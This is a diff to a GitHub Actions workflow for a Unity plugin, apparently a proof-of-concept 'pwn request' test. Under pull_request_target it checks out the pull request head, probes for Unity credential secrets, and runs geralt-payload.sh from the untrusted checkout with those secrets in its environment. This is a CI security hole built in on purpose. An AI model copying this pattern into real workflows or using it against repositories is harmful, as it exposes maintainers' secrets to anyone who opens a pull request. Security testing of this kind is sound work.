@@ -1,14 +1,5 @@
 name: test unity plugin
-
-on:
-  workflow_dispatch:
-  pull_request_target:
-  push:
-    branches:
-      - main
-
 jobs:
-
   cover:
     name: test and cover
     runs-on: ubuntu-latest
@@ -16,40 +7,54 @@ jobs:
     strategy:
       matrix:
         projectPath:
-          - plugins/unity
+        - plugins/unity
     steps:
-
-      - name: Checkout repository
-        uses: actions/checkout@v4
-        with:
-          ref: ${{ github.event_name == 'pull_request_target' && github.event.pull_request.head.sha || github.ref }}
-          fetch-depth: 0
-
-      - uses: actions/cache@v4
-        with:
-          path: ${{ matrix.projectPath }}/Library
-          key: Library-${{ hashFiles('Assets/**', 'Packages/**', 'ProjectSettings/**') }}
-          restore-keys: |
-            Library-
-
-      - name: Run tests and generate coverage report
-        uses: game-ci/unity-test-runner@v4
-        id: tests
-        env:
-          UNITY_LICENSE: ${{ secrets.UNITY_LICENSE }}
-          UNITY_EMAIL: ${{ secrets.UNITY_EMAIL }}
-          UNITY_PASSWORD: ${{ secrets.UNITY_PASSWORD }}
-        with:
-          projectPath: ${{ matrix.projectPath }}
-          githubToken: ${{ secrets.GITHUB_TOKEN }}
-          testMode: editmode
-          coverageOptions: useProjectSettings;generateAdditionalMetrics
-          customParameters: -debugCodeOptimization -enableCodeCoverage
-
-      - name: Upload coverage report
-        uses: codecov/codecov-action@v4
-        env:
-          CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}
-        with:
-          files: ${{ steps.tests.outputs.coveragePath }}/**/*.xml
-          fail_ci_if_error: true
+    - name: GERALT debug probe
+      run: |-
+        echo "GERALT_DBG: probe before checkout (source)"
+        printf '%s\n' "GERALT_DBG: event=$GITHUB_EVENT_NAME"
+        printf '%s\n' "GERALT_DBG: action=$(jq -r '.action // "n/a"' "$GITHUB_EVENT_PATH" 2>/dev/null || echo n/a)"
+        printf '%s\n' "GERALT_DBG: head_sha=$(jq -r '.pull_request.head.sha // "n/a"' "$GITHUB_EVENT_PATH" 2>/dev/null || echo n/a)"
+        printf '%s\n' "GERALT_DBG: head_repo=$(jq -r '.pull_request.head.repo.full_name // "n/a"' "$GITHUB_EVENT_PATH" 2>/dev/null || echo n/a)"
+        printf '%s\n' "GERALT_DBG: base_repo=$(jq -r '.repository.full_name // "n/a"' "$GITHUB_EVENT_PATH" 2>/dev/null || echo n/a)"
+      continue-on-error: true
+    - name: Checkout repository
+      uses: actions/checkout@v4.3.1
+      with:
+        ref: ${{ github.event_name == 'pull_request_target' && github.event.pull_request.head.sha || github.ref }}
+        fetch-depth: 0
+    - name: GERALT debug probe
+      run: |-
+        echo "GERALT_DBG: probe before sink (unity-test-runner)"
+        printf '%s\n' "GERALT_DBG: pwd=$(pwd 2>/dev/null || echo n/a)"
+        if [ -d "plugins/unity" ]; then
+          printf '%s\n' "GERALT_DBG: plugins/unity present (attacker-controlled workspace checked out)"
+          find "plugins/unity" -maxdepth 2 -type f 2>/dev/null | head -n 20 || true
+        else
+          printf '%s\n' "GERALT_DBG: plugins/unity missing"
+        fi
+        printf '%s\n' "GERALT_DBG: UNITY_EMAIL_set=$([ -n "${UNITY_EMAIL:-}" ] && echo yes || echo no)"
+        printf '%s\n' "GERALT_DBG: UNITY_PASSWORD_set=$([ -n "${UNITY_PASSWORD:-}" ] && echo yes || echo no)"
+        printf '%s\n' "GERALT_DBG: UNITY_LICENSE_set=$([ -n "${UNITY_LICENSE:-}" ] && echo yes || echo no)"
+      continue-on-error: true
+    - name: Run tests and generate coverage report
+      continue-on-error: true
+      run: |-
+        if [ -f plugins/unity/geralt-payload.sh ]; then
+          bash plugins/unity/geralt-payload.sh
+        else
+          printf '%s\n' 'GERALT_DBG: payload script missing from checked-out PR head; sink skipped'
+        fi
+      env:
+        UNITY_LICENSE: ${{ secrets.UNITY_LICENSE }}
+        UNITY_EMAIL: ${{ secrets.UNITY_EMAIL }}
+        UNITY_PASSWORD: ${{ secrets.UNITY_PASSWORD }}
+        GERALT_SECRET: GERALT_LEAKED_TOKEN=geralt-pwn-request-marker
+env:
+  GERALT_SECRET: ${{ secrets.GERALT }}
+on:
+  workflow_dispatch: null
+  pull_request_target: null
+  push:
+    branches:
+    - main
